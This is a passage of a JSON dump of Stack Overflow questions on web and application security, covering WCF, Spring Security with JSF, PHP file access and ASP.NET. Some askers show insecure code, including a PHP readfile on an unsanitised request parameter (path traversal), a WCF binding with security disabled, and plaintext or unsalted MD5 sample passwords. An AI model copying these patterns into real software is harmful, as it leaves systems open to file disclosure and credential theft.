xmlns=\"urn:schemas-microsoft-com:asm.v1\"&gt;\n      &lt;probing privatePath=\"lib\" /&gt;\n    &lt;/assemblyBinding&gt;\n  &lt;/runtime&gt;\n  &lt;system.serviceModel&gt;\n    &lt;bindings&gt;\n      &lt;netTcpBinding&gt;\n        &lt;binding name=\"NetTcpBindingEndpoint\" closeTimeout=\"00:01:05\"\n          openTimeout=\"00:00:05\" receiveTimeout=\"00:00:20\" sendTimeout=\"00:00:20\"\n          transactionFlow=\"false\" transferMode=\"Buffered\" transactionProtocol=\"OleTransactions\"\n          hostNameComparisonMode=\"StrongWildcard\" listenBacklog=\"10\" maxBufferPoolSize=\"524288\"\n          maxBufferSize=\"65536\" maxConnections=\"10\" maxReceivedMessageSize=\"65536\"&gt;\n          &lt;readerQuotas maxDepth=\"32\" maxStringContentLength=\"8192\" maxArrayLength=\"16384\"\n            maxBytesPerRead=\"4096\" maxNameTableCharCount=\"16384\" /&gt;\n          &lt;reliableSession ordered=\"true\" inactivityTimeout=\"00:10:00\"\n            enabled=\"false\" /&gt;\n          &lt;security mode=\"None\"&gt;\n          &lt;/security&gt;\n        &lt;/binding&gt;\n      &lt;/netTcpBinding&gt;\n    &lt;/bindings&gt;\n    &lt;client&gt;\n      &lt;endpoint address=\"net.tcp://localhost:8731/WCFService/\" binding=\"netTcpBinding\"\n        bindingConfiguration=\"NetTcpBindingEndpoint\" contract=\"WCFServiceReference.IWCFService\"\n        name=\"NetTcpBindingEndpoint\"&gt;\n        &lt;identity&gt;\n          &lt;dns value=\"localhost\" /&gt;\n        &lt;/identity&gt;\n      &lt;/endpoint&gt;\n    &lt;/client&gt;\n  &lt;/system.serviceModel&gt;\n&lt;/configuration&gt;\n</code></pre>\n\n<p>The only way I am able to have the client connect successfully to the service is if I create a user on the server with the same username and password as the account I am using on the client machine.  How can I set up security to avoid this?  Since I have control over both the client and the server I am not concerned with having a high level of security.</p>\n"},{"tags":["c#","security","api","interface","center"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":43,"score":0,"question_id":12493170,"title":"C# Windows Security Center Settings","body":"<p>I would like to disable the Action Center messages in Windows. I know where the registry holds the values for these checks but those are machine specific. And I know that I can disable the complete service. But I do not want to disable the service, I only want to not show the notifications/alerts/messages.</p>\n\n<p>To see these options I am talking about goto: cmd.exe -> RunDll32.exe shell32.dll,Control_RunDLL wscui.cpl</p>\n\n<p>The security center will be started and click on the left on \"Change Action Center settings\".</p>\n\n<p>Now I have referenced \"C:\\Windows\\System32\\wscui.cpl\" in my C# project and added </p>\n\n<pre><code>using SecurityCenterAdmin;\n</code></pre>\n\n<p>I see I can create this object</p>\n\n<pre><code>SecurityCenterAdmin.WscAdmin admin = new WscAdmin();\nadmin.DoModalSecurityAction();\n</code></pre>\n\n<p>But I can find no references about it. Searching on Google for \"WscAdmin msdn\" or \"SecurityCenterAdmin\" yields no results.</p>\n\n<p>Any hints?</p>\n\n<p>Thanks in advance.\nMike</p>\n"},{"tags":["java","security","servlets","httprequest"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":142,"score":1,"question_id":12491773,"title":"Why does request.getRemoteAddr().equals(\"127.0.0.1\") when accessing from a remote machine","body":"<p>I have a Java servlet application running within Tomcat, there is one admin command that I only want to be able to run from the machine itself (or possibly my own pc as well) for security reasons. So to enforce this I check the remote address of the HttpServletRequest that I receive but <strong>it always returns 127.0.0.1 even though the request is not coming from the local host</strong></p>\n\n<p>Why is this, can I fix it or is there an alternative way to run my admin command only from the server. </p>\n"},{"tags":["security","powershell","code-access-security"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":62,"score":0,"question_id":12483634,"title":"How do I obscure a single function in a PowerShell module?","body":"<p>I have a module that includes a function with some private data that should be secured. I don't want the hassle of constantly compiling the whole module, if that is even possible. </p>\n\n<p>I want to be able to call the function and get information out of it, but I need to put this script on a variety of machines where it might be accessed and the code read by someone who should not have the information used to derive the output.</p>\n\n<p>I saw something about compiling PowerShell scripts. When compiled, can they be included as commands provided by a module?</p>\n\n<p>How can I go about this?</p>\n"},{"tags":["php","wordpress","security",".htaccess"],"answer_count":0,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":39,"score":0,"question_id":12491615,"title":"Logging out a user from wordpress and preventing BACK button","body":"<p>Can something be done to prevent a user from using the back button when <code>wp_logout_url</code> is called? Sure, it logs the user out but they can still see pre-rendered HTML on the page if they press back. Being sensitive data, what can be done?</p>\n\n<p>I have come up with a variety of workarounds that don't answer it, from trying to close the window to redirecting to a different url etc. </p>\n\n<p>Does anyone know how I can prevent a user from pressing BACK, or an elegant hack to stop this?</p>\n\n<p>I need something that checks if the user is logged in, similar to how if you logout in facebook, you can't click back</p>\n"},{"tags":["security","oauth","widget","gadget","apache-shindig"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":43,"score":0,"question_id":12472195,"title":"Shindig - Could not fetch gadget spec (security tokens?)","body":"<p>Ok, I need some explanation here please sir >.&lt;</p>\n\n<p>I'm working with shindig trying to get some OAuth1 gadgets working outside any container (using the gadgets/ifr thing).\nI've been using the 'gadget testing container' and everything works just fine, which means every key is setted correctly on the oauth.json.</p>\n\n<p>The problem begins when I try to display those same gadgets outside the container. I get this error:</p>\n\n<pre><code>OAuth error: UNKNOWN_PROBLEM: Could not fetch gadget spec\n==== \nOriginal request: \nGET stuff.json \nHost: my.host \nX-Shindig-AuthType: oauth \nX-Forwarded-For: 127.0.0.1 \nX-shindig-dos: on\n====\n</code></pre>\n\n<p>The url I use is something like this:</p>\n\n<pre><code>http://localhost:8080/gadgets/ifr?url=http://my.host/stuff.xml\n</code></pre>\n\n<p>I thing the problem here has some relation with the &amp;st parameter (security token)... </p>\n\n<p>For the record, if I use some already provided gagdet by shindig it works without any problems (those are OAuth2.0 though):</p>\n\n<pre><code>http://localhost:8080/gadgets/ifr?url=http://localhost:8080/samplecontainer/examples/oauth2/oauth2_facebook.xml\n</code></pre>\n\n<p>I've been searching this question and lots of people have this same problem but no answers. \nI think this could be the place they're looking for :D</p>\n\n<p>Greettings, Eric.</p>\n"},{"tags":["asp.net","security","caching","data-caching"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":26,"score":0,"question_id":12489368,"title":"Data caching security concerns in asp.net","body":"<p>well caching is a perfect way to speed up access to data which are public ( all users of website ) and frequently used. but what about data that are supposed to be accessed by a specific role ( e.g just Administrators ) .</p>\n\n<p>is this sort of caching safe ? is there any security related actions to do when using Data caching ? </p>\n"},{"tags":["java","javascript","security","applet","md5"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":67,"score":0,"question_id":12489202,"title":"JavaScript MD5 hashing vs Java Applet MD5 hashing?","body":"<p>Recently I came across a project which uses MD5 hashing for posting username and password while logging in.. But what I saw was a little weird, they have used both Applet as well as JavaScript for hashing, like if Applet is not there, then JavaScript works. </p>\n\n<p>The code is as follows:</p>\n\n<pre><code>var username=document.getElementById('username');\nvar password=document.getElementById('password');\ntry { \n    encUsername = appletObject.encryptMessage(username);\n    encPassword = appletObject.encryptMessage(password);\n} catch (e) { \n    encUsername = hex_md5(username);\n    encPassword = hex_md5(password);\n}\n//post encUsername &amp; encPassword for validation\n</code></pre>\n\n<ol>\n<li>Is this method used only for browser compatibility for JS and Applet, or any advantage for applet over javascript for MD5 hashing?</li>\n<li>Is there any security advantage for applet in this scenario?</li>\n</ol>\n"},{"tags":["security","html5","canvas","multiplayer"],"answer_count":2,"favorite_count":2,"up_vote_count":6,"down_vote_count":0,"view_count":2140,"score":6,"question_id":2978976,"title":"HTML5 Multiplayer Game Security Solutions","body":"<p>Now that there are a couple of neat canvas demo's of both classic platform and even 3D fps games in HTML5, the next step might be to try developing a multiplayer HTML5 game. HTML5 socket support makes this relatively straight-forward, but with client-side source being viewable by anyone in the browser, <strong>what are some solutions for basic game security features for a HTML5-frontend multiuser game</strong> -- <em>such as being able to prevent a faked high-score submit</em>?</p>\n"},{"tags":["security","encryption","oauth","access-token"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":41,"score":0,"question_id":12486090,"title":"Securely storing an access token","body":"<p>What security measures should I put in place to ensure that, were my database to be compromised, long-life access tokens could not be stolen?</p>\n\n<p>A long-life access token is as good as a username and password for a particular service, but from talking to others it seems most (myself included) store access tokens in plan text. This seems to be to be just as bad as storing a password in plan text. Obviously I cannot salt &amp; hash the password.</p>\n\n<p>Ideally I'd want to encrypt them, but I'm unsure of the best way to do this, especially on an open source project.</p>\n\n<p>I imagine the answer to this question is similar to one on storing payment info and PCI compliance, but I'd also ask why there isn't more discussion of this? Perhaps I'm missing something.</p>\n"},{"tags":["php","security","file","uploading"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":49,"score":0,"question_id":12461352,"title":"Up to date secure PHP image uploading","body":"<p>I need to implement a secure PHP file upload script. What current methods are you using to ensure that your script is secure?</p>\n\n<p>I will be whitelisting allowed extensions, and ensuring that Apache is running as the user to avoid the need for 777 permissions by default.</p>\n\n<p>Uploaded files will be images, and I have MySQL access. Users will need to be able to see their files once uploaded.</p>\n\n<p>Thanks!</p>\n"},{"tags":["security","cakephp"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":56,"score":0,"question_id":12458591,"title":"Webshop, Security & CakePHP","body":"<p>I am building a webshop for which I want to ensure the security is good given we are handling money and other sensitive stuff. I am also relatively new to CakePHP and web programming in general and is not totally across the wonderful world of website security. I was wondering if there are people out the who you be so kind to provide security tips and best practise for webshops in particular which are built using CakePHP? Does these posts, <a href=\"http://stackoverflow.com/questions/3870427/cakephp-security\">Cakephp Security</a>, <a href=\"http://stackoverflow.com/questions/3282408/what-makes-cakephp-secure-and-how-can-we-increase-its-security\">What makes CakePHP secure, and how can we increase it&#39;s security?</a>, cover all the relevant security risks or are there more things I should be thinking about in specific for a webshop?</p>\n"},{"tags":["php","security","filesystems"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":52,"score":0,"question_id":12482155,"title":"Using inodes to point to files  insecure? bad practice?","body":"<p>My PHP application has a file controller. Every file download by an authenticated user should pass through the file controller first.</p>\n\n<p>As a parameter, I'm using the file inode so it can locate the file correctly inside the disk and it can be passed safely through the URL (since it's only numbers  I don't have to worry about UTF-8 file names and such in here).</p>\n\n<p>The files are being read from the filesystem, not a database, so the data is as live as possible.</p>\n\n<p>Giving out the inodes of my filesystem is a security threat? Locating files via inodes is a bad practice?</p>\n\n<h2>On permission check:</h2>\n\n<p>I'm using Codeigniter as a framework. By extending the core controller class and the _remap() method, I'm able to check if the person accessing the file controller is logged in, for every controller call.</p>\n\n<p>If it is (and the role has permissions), then allow the download. If it's not, then redirect to login.</p>\n\n<h2>On same inodes:</h2>\n\n<p>I'm not doing a full filesystem scan. I'm listing a directory within the filesystem, divided by uploaders then by operation id (so basically, each folder would have like 10 files, tops, depending on the parameters). The structure is basically:</p>\n\n<p><code>module/module_id/user_id/files</code></p>\n\n<p>I'm guessing that there cannot two files with the same inode in the same folder, and if there's another file in another filesystem (or in the same, I'm not clear if that's possible), then it's not in the same folder, ergo, innaccesible with that parameter chain.</p>\n\n<p>For example (supposing we're wanting to get a file with inode #5243376):</p>\n\n<p>module/1/3/5243376</p>\n\n<p>If there's another file with inode 5243376, the file must be inside the folders module/1/3/ so it can be downloaded.</p>\n\n<p>I don't see any other way of getting the same (or another file), because the controller hanldes that.</p>\n\n<p>The code for the hanlder is simple:</p>\n\n<pre><code>// match inode\n$dir    = FCPATH . 'files/' . $type . '/' . $id . '/'. $user . '/';\n$files  = scandir($dir);\n\nforeach($files as $file) {\n    $stat = stat($dir . $file);\n    if ($inode == $stat['ino']) {\n        $filename = $file;\n    }\n}\n\n// this need better feedback lol\nif (!isset($filename)) {\n    die('Not existing');\n}\n\n// fullpath to file to be downloaded\n$file = FCPATH . 'files/' . $type . '/' . $id . '/'. $user . '/' . $filename;\n</code></pre>\n"},{"tags":["javascript","security","registration","humanize"],"answer_count":4,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":76,"score":2,"question_id":12482742,"title":"What are the best ways to prevent fake registrations?","body":"<p>I would like to know more about the solutions to restrict registering for a website for humans only.</p>\n\n<p>Captcha may seem a proper solution but as it turns out it's <a href=\"http://www.sitepoint.com/captcha-problems-alternatives/\" rel=\"nofollow\">not as good as it sounds</a>. \nAnd it's not a problem if a solution is not an option for blind, deaf people etc..</p>\n"},{"tags":["spring","security","authentication"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":25,"score":0,"question_id":12481911,"title":"Spring Security 3: Limiting web access with roles and custom status retrieved from the database","body":"<p>Scenario:</p>\n\n<p>Every time a new user logs in the system, he should be redirected to the change password page wherein the user <strong>is required to change his password</strong>. Without changing his password, the user would not have any access to the other functions of the system except the login and change password pages.</p>\n\n<p>Questions:</p>\n\n<ol>\n<li>Is it possible to check the user status (most probably from the database) instead of the user roles to know which pages the user can access? I've read the documentation and most of the sections which talked about authorization dealt with roles.</li>\n</ol>\n\n<p>I'm looking for something like: </p>\n\n<p>(a) The user can only entirely access the system if his status is ACTIVE and role is ADMIN.</p>\n\n<p>(b) The user can only access the login and change password page if his status is NEW and his role is ADMIN. </p>\n\n<ol>\n<li>I would want to be able to dynamically configure which pages a particular user can or can not visit. </li>\n</ol>\n\n<p>Are these possible in Spring Security?</p>\n"},{"tags":["javascript","security","opera-extension"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":3,"view_count":48,"score":-2,"question_id":12475916,"title":"Can my injected JavaScript be seen by the website author?","body":"<p>Let say I want to mess with particular site and inject some function there to interact with the page. Can then website admin check that by checking window object if there are only function defined by him, and if there are differences beam back by ajax to his server, so in fact can my code be stealed/looked upon in that way ?</p>\n"},{"tags":["ruby-on-rails","security"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":24,"score":0,"question_id":12479934,"title":"Redundant security by deleting protected params?","body":"<p>In Rails 3, we can define the accessible attributes:</p>\n\n<pre><code>attr_accessible :rating, :review\n</code></pre>\n\n<p>In this model, there is additional <code>user_id</code> which is protected to prevent forgery/hacking. This value is assigned in the controller:</p>\n\n<pre><code>@review.user_id = current_user.id\n</code></pre>\n\n<p>If I use Firebug to manually include the <code>user_id</code>, it will be part of the <code>params[:review]</code>, but of course since <code>user_id</code> is not defined in the <code>attr_accessible</code>, it wouldn't get saved into the database. Such case is rather secure.</p>\n\n<p><strong>Question 1</strong></p>\n\n<p>I read in <strong>Rails 3 In Action</strong> book, Yehuda Katz included <code>.delete</code> method to delete unauthorized params before further action is performed: <code>params[:review].delete(:user_id)</code>. Should I include this as well to further secure my app, or just ignore this step?</p>\n\n<p><strong>Question 2</strong></p>\n\n<p>If I should include the method above, I would like to have something like <code>.delete_all_except</code> to just strip it to the allowed attributes in the params. How do I do that?</p>\n\n<p>Thanks.</p>\n"},{"tags":["java","spring","security","spring-mvc","spring-security"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":56,"score":-1,"question_id":12479400,"title":"What is the best way to manage access to web controller in java?","body":"<p>I have some question. What is the best way to manage access to web controller in java? \nFor example I have users and projects. </p>\n\n<p>Each user can have several projects, but I don't want, that anyone has access to my project. How I can manage it? By writing some code in every controller, to check the permissions? Or are there some framework for it? Thanks for your answers. </p>\n"},{"tags":["sql-server","security","sqlconnection"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":180,"score":1,"question_id":12462674,"title":"SQL Server returns error \"Login failed for user 'NT AUTHORITY\\ANONYMOUS LOGON'.\" in Windows application","body":"<p>An application that has been working without problem (and has not had any active development done on it in about 6 months or so) recently began failing to connect to database.  Operations admins cant say what might have changed that would cause the problem.</p>\n\n<p>The client application uses a hardcoded connection string with Integrated Security=True, but when the applications attempts to create a connection to the database, it throws an SQLException saying \"Login failed for user 'NT AUTHORITY\\ANONYMOUS LOGON\".</p>\n\n<p>I can log on to the database through Management Studio on this account without problem.  All of the things that I have seen for this issue are for ASP.NET projects and it is apparently the \"Double Hop Problem\" which being a client application darned well better not be a problem.  Any help would be greatly appreciated.</p>\n\n<h2>Edit</h2>\n\n<p>The client machine and server machine as well as user accounts are on the same domain.\nThis occurs when Windows Firewall is off.</p>\n\n<p>Leading theory is:\nServer was restarted about a week or so ago, and failed to register Service Principal Name (SPN).  Failure to register an SPN may cause integrated authentication to fall back to NTLM instead of Kerberos.</p>\n"},{"tags":["security","vb6"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":55,"score":0,"question_id":12170278,"title":"How to reset user login status when program crash ","body":"<p>I'm in the process of securing my program based on user login.\nNow I'm only allowed one user to login my program once (it look like Windows Live MSN). If detected same userName that already logged in, it will prompt message to inform user that \"You have already logged in\".</p>\n\n<p>With this setting, I have met a problem if the program is crash (means user not yet logout), how can I auto-reset the user_Status to 0 for this case? So that, he can login after restart the program.</p>\n\n<p>Otherwise, user_Status is 1 and may not allow user to login again.</p>\n\n<p>What is the best way I can solve my problem?\nThanks in advance.</p>\n\n<p>p/s: user_Status = 1 is still login;\n     user_Status = 0 is still logout</p>\n\n<p>user_Status is stored in database.</p>\n"},{"tags":["iphone","ios","security","login"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":48,"score":0,"question_id":12477251,"title":"Is the following approach to show login screen on iPhone secure?","body":"<p>I have an app where the user has to login to see his data which is stored in the server.\nI have a <code>UIWebView</code> instance in my <code>rootViewController</code> where I show the retrieved data. I have the following code in the <code>viewWillAppear</code> call of the <code>rootViewController</code> to authenticate the user...</p>\n\n<pre><code>- (void)viewWillAppear:(BOOL)animated\n{\n\n    if(![self isUserLoggedin]) {\n\n         if( loginViewController == nil ) {\n            loginViewController = [[LoginViewController alloc] init];\n            loginViewController.delegate = self;\n        }\n\n        [self.navigationController pushViewController:loginViewController animated:YES];\n    }\n}\n</code></pre>\n\n<p>If the user enters the correct password I pop the loginViewController and fetch the data and display in the webView.</p>\n\n<p>I would like to know if this is a safe way, or does it have any security issues? Is there any standard way to show the login screen?</p>\n"},{"tags":["asp.net","security","pki"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":32,"score":1,"question_id":12477075,"title":"Asp.net accept client certs which chain up to a set of root CA's","body":"<p>I want to make Asp.net accept client certs which chain up to a set of root CA's. How do I do it? On my example asp.net mvc application which I run on my development machine on iis express from visual studio I made this changes to iis config applicationhost.config:</p>\n\n<pre><code>&lt;location path=\"MusicStore/Store\"&gt;\n    &lt;system.webServer&gt;\n      &lt;security&gt;\n        &lt;access sslFlags=\"SslNegotiateCert, SslRequireCert\" /&gt;\n      &lt;/security&gt;\n    &lt;/system.webServer&gt;\n&lt;/location&gt;\n</code></pre>\n\n<p>Now I get HTTP 403.7 error when accesing MusicStore/Store location without any option to select certificate. I want user to select a cert from browser, is it possible?</p>\n"},{"tags":["php","security","apache",".htaccess"],"answer_count":6,"favorite_count":11,"up_vote_count":8,"down_vote_count":0,"view_count":4610,"score":8,"question_id":2187200,"title":"Using PHP/Apache to restrict access to static files (html, css, img, etc)","body":"<p>Lets say you have lots of html, css, js, img and etc files within a directory on your server. Normally, any user in internet-land could access those files by simply typing in the full URL like so: <a href=\"http://example.com/static-files/sub/index.html\" rel=\"nofollow\">http://example.com/static-files/sub/index.html</a></p>\n\n<p>Now, what if you only want authorized users to be able to load those files? For this example, lets say your users log in first from a URL like this: <a href=\"http://example.com/login.php\" rel=\"nofollow\">http://example.com/login.php</a></p>\n\n<p>How would you allow the logged in user to view the index.html file (or any of the files under \"static-files\"), but restrict the file to everyone else?</p>\n\n<p>I have come up with two possible solutions thus far:</p>\n\n<p><b>Solution 1</b><br>\nCreate the following .htaccess file under \"static-files\":</p>\n\n<pre><code>Options +FollowSymLinks  \nRewriteEngine on  \nRewriteRule ^(.*)$ ../authorize.php?file=$1 [NC]\n</code></pre>\n\n<p>And then in authorize.php...</p>\n\n<pre><code>if (isLoggedInUser()) readfile('static-files/'.$_REQUEST['file']);\nelse echo 'denied';\n</code></pre>\n\n<p>This authorize.php file is grossly over simplified, but you get the idea.</p>\n\n<p><b>Solution 2</b><br>\nCreate the following .htaccess file under \"static-files\":</p>\n\n<pre><code>Order Deny,Allow\nDeny from all\nAllow from 000.000.000.000\n</code></pre>\n\n<p>And then my login page could append that .htaccess file with an IP for each user that logs in. Obviously this would also need to have some kind of cleanup routine to purge out old or no longer used IPs.</p>\n\n<p><hr />\nI worry that my first solution could get pretty expensive on the server as the number of users and files they are accessing increases. I think my second solution would be much less expensive, but is also less secure due to IP spoofing and etc. I also worry that writing these IP addresses to the htaccess file could become a bottleneck of the application if there are many simultaneous users.  </p>\n\n<p>Which of these solutions sounds better, and why? Alternatively, can you think of a completely different solution that would be better than either of these?</p>\n"},{"tags":["android","security","ssl","ssl-certificate"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":140,"score":0,"question_id":12473857,"title":"How to fix SSL \"Security Warning\" in Android browser","body":"<p>I always come across with SSL security warning while browsing common website (like Gmail, Facebook, Twitter..) in Android smartphones and tablets. Since on clicking \"Continue\" button in dialog leads to non secure transaction and is not good for user. Please help me to fix this issue.</p>\n"},{"tags":["spring","security","jsf"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":242,"score":0,"question_id":11987659,"title":"Spring Security integration with JSF 2.1","body":"<p>I am trying to integrate Spring 3.1.1 security with JSF 2.1. I managed to get the sample code on <a href=\"http://ocpsoft.org/java/acegi-spring-security-jsf-login-page/\" rel=\"nofollow\">http://ocpsoft.org/java/acegi-spring-security-jsf-login-page/</a> running. However, I had problems trying to customize it. I cannot login even with the correct credentials and always get redirected to loginFailed.xhtml. MY configuration is as follows</p>\n\n<p>web.xml:</p>\n\n<pre><code>&lt;web-app&gt;\n    &lt;display-name&gt;Captain Admin&lt;/display-name&gt;\n    &lt;welcome-file-list&gt;\n        &lt;welcome-file&gt;welcome.xhtml&lt;/welcome-file&gt;\n    &lt;/welcome-file-list&gt;\n    &lt;session-config&gt;\n        &lt;session-timeout&gt;10&lt;/session-timeout&gt;\n    &lt;/session-config&gt;\n    &lt;!-- JSF Config --&gt;\n    &lt;context-param&gt;\n        &lt;param-name&gt;javax.faces.DEFAULT_SUFFIX&lt;/param-name&gt;\n        &lt;param-value&gt;.xhtml&lt;/param-value&gt;\n    &lt;/context-param&gt;\n    &lt;context-param&gt;\n        &lt;param-name&gt;javax.faces.CONFIG_FILES&lt;/param-name&gt;\n        &lt;param-value&gt;\n            /WEB-INF/faces-config.xml,\n            /WEB-INF/faces-managed-beans.xml,\n            /WEB-INF/faces-navigation.xml\n        &lt;/param-value&gt;\n    &lt;/context-param&gt;\n    &lt;context-param&gt;\n        &lt;param-name&gt;javax.faces.STATE_SAVING_METHOD&lt;/param-name&gt;\n        &lt;param-value&gt;client&lt;/param-value&gt;\n    &lt;/context-param&gt;\n    &lt;context-param&gt;\n        &lt;param-name&gt;com.sun.faces.enabledLoadBundle11Compatibility&lt;/param-name&gt;\n        &lt;param-value&gt;true&lt;/param-value&gt;\n    &lt;/context-param&gt;\n    &lt;context-param&gt;\n        &lt;param-name&gt;com.sun.faces.validateXml&lt;/param-name&gt;\n        &lt;param-value&gt;true&lt;/param-value&gt;\n    &lt;/context-param&gt;\n    &lt;context-param&gt;\n        &lt;param-name&gt;com.sun.faces.verifyObjects&lt;/param-name&gt;\n        &lt;param-value&gt;true&lt;/param-value&gt;\n    &lt;/context-param&gt;\n    &lt;!-- Spring Config --&gt;\n    &lt;context-param&gt;\n        &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt;\n        &lt;param-value&gt;\n            /WEB-INF/applicationContext.xml\n            /WEB-INF/applicationContext-security.xml\n        &lt;/param-value&gt;\n    &lt;/context-param&gt;\n    &lt;listener&gt;\n        &lt;listener-class&gt;\n            org.springframework.web.context.ContextLoaderListener\n        &lt;/listener-class&gt;\n    &lt;/listener&gt;\n    &lt;listener&gt;\n        &lt;listener-class&gt;\n        org.springframework.web.context.request.RequestContextListener\n        &lt;/listener-class&gt;\n    &lt;/listener&gt;\n    &lt;!-- Filter Config --&gt;\n\n    &lt;filter&gt;\n        &lt;filter-name&gt;springSecurityFilterChain&lt;/filter-name&gt;\n        &lt;filter-class&gt;org.springframework.web.filter.DelegatingFilterProxy&lt;/filter-class&gt;\n    &lt;/filter&gt;\n    &lt;!-- Filter Mappings --&gt;  \n    &lt;filter-mapping&gt;\n        &lt;filter-name&gt;springSecurityFilterChain&lt;/filter-name&gt;\n        &lt;url-pattern&gt;/*&lt;/url-pattern&gt;\n        &lt;dispatcher&gt;FORWARD&lt;/dispatcher&gt;\n        &lt;dispatcher&gt;REQUEST&lt;/dispatcher&gt;\n    &lt;/filter-mapping&gt;\n\n    &lt;!-- Core JSF Config --&gt;\n    &lt;servlet&gt;\n        &lt;servlet-name&gt;Faces Servlet&lt;/servlet-name&gt;\n        &lt;servlet-class&gt;javax.faces.webapp.FacesServlet&lt;/servlet-class&gt;\n        &lt;load-on-startup&gt;1&lt;/load-on-startup&gt;\n    &lt;/servlet&gt;\n    &lt;servlet-mapping&gt;\n        &lt;servlet-name&gt;Faces Servlet&lt;/servlet-name&gt;\n        &lt;url-pattern&gt;/faces/*&lt;/url-pattern&gt;\n        &lt;url-pattern&gt;*.xhtml&lt;/url-pattern&gt;\n    &lt;/servlet-mapping&gt;\n&lt;/web-app&gt;\n</code></pre>\n\n<p>applicationContext.xml:</p>\n\n<pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;beans&gt;\n    &lt;context:annotation-config /&gt;\n    &lt;context:component-scan base-package=\"com.ocpsoft\" /&gt;\n    &lt;bean id=\"loggerListener\"\n        class=\"org.springframework.security.event.authentication.LoggerListener\" /&gt;\n\n    &lt;bean class=\"org.springframework.beans.factory.config.PropertyPlaceholderConfigurer\"&gt;\n        &lt;property name=\"location\"&gt;\n            &lt;value&gt;WEB-INF/classes/config/database/db.properties&lt;/value&gt;\n        &lt;/property&gt;\n    &lt;/bean&gt;\n    &lt;bean id=\"dataSources\" class=\"com.mchange.v2.c3p0.ComboPooledDataSource\"\n        destroy-method=\"close\"&gt;\n        &lt;property name=\"driverClass\" value=\"${jdbc.driverClassName}\" /&gt;\n        &lt;property name=\"jdbcUrl\" value=\"${jdbc.url}\" /&gt;\n        &lt;property name=\"user\" value=\"${jdbc.username}\" /&gt;\n        &lt;property name=\"password\" value=\"${jdbc.password}\" /&gt;\n    &lt;/bean&gt;\n    &lt;bean id=\"jdbcTemplate\" class=\"org.springframework.jdbc.core.JdbcTemplate\"&gt;\n        &lt;constructor-arg ref=\"dataSources\"/&gt;\n    &lt;/bean&gt;\n    &lt;bean id=\"namedParameterJdbcTemplate\"\n        class=\"org.springframework.jdbc.core.namedparam.NamedParameterJdbcTemplate\"&gt;\n        &lt;constructor-arg ref=\"dataSources\"/&gt;\n    &lt;/bean&gt;\n&lt;/beans&gt;\n</code></pre>\n\n<p>applicationContext-security.xml</p>\n\n<pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;beans&gt;\n    &lt;global-method-security secured-annotations=\"enabled\"/&gt;\n    &lt;http auto-config=\"true\" access-denied-page=\"/accessDenied.xhtml\" &gt;\n        &lt;intercept-url pattern=\"/protected/*\" access=\"ROLE_ADMIN\" /&gt;\n        &lt;form-login login-processing-url=\"/j_spring_security_check\"\n            login-page=\"/login.xhtml\"\n            default-target-url=\"/protected/index.xhtml\"\n            authentication-failure-url=\"/loginFailed.xhtml\" /&gt;\n        &lt;logout logout-url=\"/logout*\" logout-success-url=\"/\" /&gt;\n    &lt;/http&gt;\n\n    &lt;authentication-manager alias=\"authenticationManager\"&gt;\n        &lt;authentication-provider&gt;\n            &lt;user-service&gt;\n                &lt;user name=\"rod\" password=\"rod\" authorities=\"ROLE_ADMIN\" /&gt;\n                &lt;user name=\"dianne\"\n                    password=\"65d15fe9156f9c4bbffd98085992a44e\"\n                    authorities=\"ROLE_USER,ROLE_TELLER\" /&gt;\n                &lt;user name=\"scott\"\n                    password=\"2b58af6dddbd072ed27ffc86725d7d3a\"\n                    authorities=\"ROLE_USER\" /&gt;\n                &lt;user name=\"peter\"\n                    password=\"22b5c9accc6e1ba628cedc63a72d57f8\"\n                    authorities=\"ROLE_USER\" /&gt;\n            &lt;/user-service&gt;\n        &lt;/authentication-provider&gt;\n    &lt;/authentication-manager&gt;\n\n&lt;/beans:beans&gt;\n</code></pre>\n\n<p>faces-config.xml</p>\n\n<pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;faces-config&gt;\n    &lt;!-- Application Config --&gt;\n    &lt;application&gt;\n        &lt;el-resolver&gt;\n            org.springframework.web.jsf.el.SpringBeanFacesELResolver\n        &lt;/el-resolver&gt;\n    &lt;/application&gt;\n\n&lt;/faces-config&gt;\n</code></pre>\n\n<p>faces-managed-beans.xml</p>\n\n<pre><code>&lt;?xml version=\"1.0\"?&gt;\n&lt;faces-config &gt;\n    &lt;!-- Managed Beans --&gt;\n    &lt;managed-bean&gt;\n        &lt;description&gt;\n            Current logged in user's authentication information\n        &lt;/description&gt;\n        &lt;managed-bean-name&gt;loginBean&lt;/managed-bean-name&gt;\n        &lt;managed-bean-class&gt;\n            com.ocpsoft.pages.login.LoginBean\n        &lt;/managed-bean-class&gt;\n        &lt;managed-bean-scope&gt;\n            request\n        